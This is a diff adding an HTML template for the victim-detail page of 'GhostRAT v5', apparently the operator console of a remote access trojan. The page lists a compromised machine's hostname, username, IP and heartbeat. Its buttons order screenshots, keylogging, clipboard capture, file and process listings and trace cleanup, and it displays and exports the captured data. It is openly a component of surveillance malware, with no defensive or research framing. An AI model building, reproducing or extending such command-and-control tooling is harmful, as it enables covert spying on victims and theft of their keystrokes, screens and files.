@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostRAT v5 — Victim {{ victim.id }}</title>
+    <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='img/logo.svg') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <img src="{{ url_for('static', filename='img/logo.svg') }}" alt="GhostRAT" class="logo">
+                <span class="version">v5</span>
+            </div>
+            <nav class="sidebar-nav">
+                <a href="{{ url_for('dashboard') }}" class="nav-item">
+                    <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
+                    Victims
+                </a>
+            </nav>
+            <div class="sidebar-footer">
+                <div class="user-info">
+                    <span class="username">{{ session.username }}</span>
+                </div>
+                <a href="{{ url_for('logout') }}" class="logout-btn">
+                    <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
+                    Logout
+                </a>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="top-bar">
+                <div class="back-nav">
+                    <a href="{{ url_for('dashboard') }}" class="back-link">
+                        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        Back
+                    </a>
+                </div>
+                <h1>Victim: {{ victim.id }}</h1>
+                <div class="top-bar-actions">
+                    <span class="status-badge {{ 'online' if victim.status == 'online' else 'offline' }}">
+                        {{ victim.status }}
+                    </span>
+                </div>
+            </header>
+
+            <div class="content-area">
+                <!-- Victim Info -->
+                <div class="victim-info-card">
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <span class="info-label">ID</span>
+                            <span class="info-value">{{ victim.id }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">OS</span>
+                            <span class="info-value">{{ victim.os_info }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Hostname</span>
+                            <span class="info-value">{{ victim.hostname }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Username</span>
+                            <span class="info-value">{{ victim.username }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">IP Address</span>
+                            <span class="info-value">{{ victim.ip_address }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Last Heartbeat</span>
+                            <span class="info-value">{{ victim.last_heartbeat }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Commands Sent</span>
+                            <span class="info-value">{{ victim.commands_received }}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Results Received</span>
+                            <span class="info-value">{{ victim.results_count }}</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Commands -->
+                <div class="quick-commands">
+                    <h3>Quick Commands</h3>
+                    <div class="command-buttons">
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('beacon')">Beacon</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('info')">System Info</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('screenshot')">Screenshot</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('keylog')">Keylog</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('filelist')">File List</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('processlist')">Processes</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('network')">Network</button>
+                        <button class="btn btn-sm btn-primary" onclick="sendQuickCommand('clipboard')">Clipboard</button>
+                        <button class="btn btn-sm btn-warning" onclick="sendQuickCommand('cleanup')">Cleanup</button>
+                    </div>
+                </div>
+
+                <!-- Results Tabs -->
+                <div class="tabs">
+                    <button class="tab active" data-tab="results">Results ({{ results|length }})</button>
+                    <button class="tab" data-tab="commands">Commands ({{ commands|length }})</button>
+                </div>
+
+                <div class="tab-content">
+                    <!-- Results Tab -->
+                    <div class="tab-panel active" id="resultsPanel">
+                        {% if results %}
+                        <div class="results-list">
+                            {% for result in results %}
+                            <div class="result-card">
+                                <div class="result-header">
+                                    <span class="result-type result-type-{{ result.result_type }}">{{ result.result_type }}</span>
+                                    <span class="result-time">{{ result.timestamp }}</span>
+                                </div>
+                                <div class="result-body">
+                                    {% if result.result_type == 'screenshot' and result.data %}
+                                        {% if result.data.startswith('data:image') %}
+                                            <img src="{{ result.data }}" alt="Screenshot" class="result-image" onclick="openImageModal(this.src)">
+                                        {% else %}
+                                            <img src="data:image/png;base64,{{ result.data }}" alt="Screenshot" class="result-image" onclick="openImageModal('data:image/png;base64,{{ result.data }}')">
+                                        {% endif %}
+                                    {% elif result.result_type == 'keylog' %}
+                                        <pre class="result-text">{{ result.data }}</pre>
+                                    {% elif result.result_type in ('filelist', 'processlist') %}
+                                        <pre class="result-text">{{ result.data }}</pre>
+                                    {% else %}
+                                        <pre class="result-text">{{ result.data }}</pre>
+                                    {% endif %}
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% else %}
+                        <div class="empty-state">
+                            <p>No results received yet.</p>
+                        </div>
+                        {% endif %}
+                    </div>
+
+                    <!-- Commands Tab -->
+                    <div class="tab-panel" id="commandsPanel">
+                        {% if commands %}
+                        <div class="commands-list">
+                            {% for cmd in commands %}
+                            <div class="command-card">
+                                <div class="command-header">
+                                    <span class="command-type">{{ cmd.command_type }}</span>
+                                    <span class="command-time">{{ cmd.timestamp }}</span>
+                                </div>
+                                <div class="command-body">
+                                    <span class="command-status status-{{ cmd.status }}">{{ cmd.status }}</span>
+                                    {% if cmd.command_data %}
+                                        <pre class="command-data">{{ cmd.command_data }}</pre>
+                                    {% endif %}
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% else %}
+                        <div class="empty-state">
+                            <p>No commands sent yet.</p>
+                        </div>
+                        {% endif %}
+                    </div>
+                </div>
+
+                <!-- Export Button -->
+                <div class="export-actions">
+                    <a href="{{ url_for('api_export', victim_id=victim.id) }}" class="btn btn-outline" download>
+                        <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                        Export as JSON
+                    </a>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Image Modal -->
+    <div class="modal" id="imageModal" onclick="closeImageModal()">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <img id="modalImage" src="" alt="Full screenshot">
+            <button class="modal-close" onclick="closeImageModal()">✕</button>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/victim.js') }}"></script>
+</body>
+</html>
